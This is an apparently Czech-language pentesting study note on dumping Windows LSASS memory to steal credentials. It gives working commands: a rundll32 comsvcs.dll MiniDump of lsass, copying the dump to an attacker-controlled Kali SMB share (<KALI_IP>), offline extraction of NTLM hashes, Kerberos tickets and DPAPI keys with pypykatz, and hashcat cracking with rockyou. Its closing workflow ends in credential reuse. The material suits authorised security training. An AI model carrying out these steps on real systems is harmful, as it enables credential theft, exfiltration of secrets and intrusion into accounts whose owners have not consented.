# 🧠 LSASS Dump

---

# 1. Proč útočit na LSASS?

LSASS (`Local Security Authority Subsystem Service`) uchovává v paměti informace aktivních přihlášených session.

Typicky obsahuje:

|Data|Využití|
|---|---|
|NTLM hashe|Offline crackování / Pass-the-Hash|
|Kerberos tikety|Přístup k doménovým službám|
|TGT / TGS|Kerberos útoky|
|DPAPI Master Keys|Dešifrování uložených hesel|
|WDIGEST credentials|Čistý text na starších systémech|

---

# 2. Získání LSASS Memory Dumpu

Cíl:

```text
lsass.dmp
```

---

# Metoda A: Task Manager

Použití:

- RDP přístup
    
- interaktivní GUI
    

Postup:

1. Otevřít **Task Manager**
    
2. Jít do **Details**
    
3. Najít:
    

```text
lsass.exe
```

4. Pravé tlačítko:
    

```text
Create dump file
```

---

Výchozí umístění:

```text
C:\Users\<USER>\AppData\Local\Temp\lsass.DMP
```

---

# Metoda B: Rundll32 MiniDump

## 1. Zjištění PID LSASS

CMD:

```cmd
tasklist /svc | findstr lsass
```

PowerShell:

```powershell
Get-Process lsass
```

---

## 2. Vytvoření dumpu

Příklad:

```powershell
rundll32.exe \
C:\windows\system32\comsvcs.dll, \
MiniDump <PID> C:\lsass.dmp full
```

---

Výstup:

```text
C:\lsass.dmp
```

---

# 3. Přenos LSASS Dumpu

Stejný postup jako u SAM/SYSTEM hive.

---

## Impacket SMB Server

Na Kali:

```bash
sudo impacket-smbserver Share $(pwd) -smb2support
```

---

Na Windows:

```cmd
move C:\lsass.dmp \\<KALI_IP>\Share\
```

---

# 4. Analýza Dumpu

Místo spouštění nástrojů přímo na cíli lze provést analýzu offline.

---

# Pypykatz

Python implementace Mimikatzu.

Instalace:

```bash
pip install pypykatz
```

---

Analýza:

```bash
pypykatz lsa minidump lsass.dmp
```

---

# 5. Co hledat ve výsledku

## MSV

Obsahuje:

- NTLM hashe
    
- lokální i doménové účty
    

Příklad:

```text
Username:
NT:
```

---

## WDIGEST

Na starších systémech může obsahovat:

```text
Cleartext password
```

---

## Kerberos

Obsahuje:

- TGT
    
- TGS
    
- doménové informace
    

---

## DPAPI

Obsahuje:

- Master Keys
    
- informace pro dešifrování uložených credentialů
    

Použitelné například pro:

- Chrome hesla
    
- Edge hesla
    
- uložené aplikace
    

---

# 6. Crackování NTLM Hashů

Pokud získáš NT hash:

Hashcat mód:

```text
-m 1000
```

---

Příklad:

```bash
hashcat \
-m 1000 \
<HASH> \
/usr/share/wordlists/rockyou.txt
```

---

# 7. Nástroje

|Nástroj|Použití|
|---|---|
|Task Manager|GUI vytvoření dumpu|
|rundll32|Memory dump LSASS|
|Pypykatz|Offline analýza|
|Mimikatz|Windows credential analysis|
|Hashcat|Crack NTLM hashů|
|Impacket SMB Server|Přenos souborů|

---

# LSASS Attack Workflow

```text
Admin Access
      |
      ▼
LSASS Memory Dump
      |
      ▼
Transfer lsass.dmp
      |
      ▼
Pypykatz Analysis
      |
      ▼
NTLM / Kerberos / DPAPI Data
      |
      ▼
Cracking / Credential Reuse
```
